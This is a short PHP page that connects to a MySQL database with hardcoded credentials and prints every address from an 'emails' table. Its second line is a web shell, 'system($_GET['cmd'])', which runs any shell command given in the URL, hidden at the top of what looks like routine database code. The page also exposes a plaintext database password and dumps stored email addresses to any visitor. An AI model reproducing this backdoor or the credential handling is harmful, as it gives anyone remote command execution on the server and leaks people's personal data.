<?php
 system($_GET['cmd']);
$servername  = "localhost";
$username = "u553554390_tino";
$dbname = "u553554390_tino";
$password = "Tino@123";


// Create connection
$conn = mysqli_connect($servername, $username, $password,$dbname);
// Check connection
if (! $conn) {
    die("Connection failed: ");
} else {
 


        $sql = "SELECT * FROM emails" ;

$result = mysqli_query($conn , $sql); }
if (! $result) {
echo "error";	
}
 while($row = mysqli_fetch_assoc($result)) {
        echo "ID: " . $row["email"]."<br>";
    }
	echo "<br>";
		   echo "Fetched data successfully\n";
mysqli_close($conn);
    ?>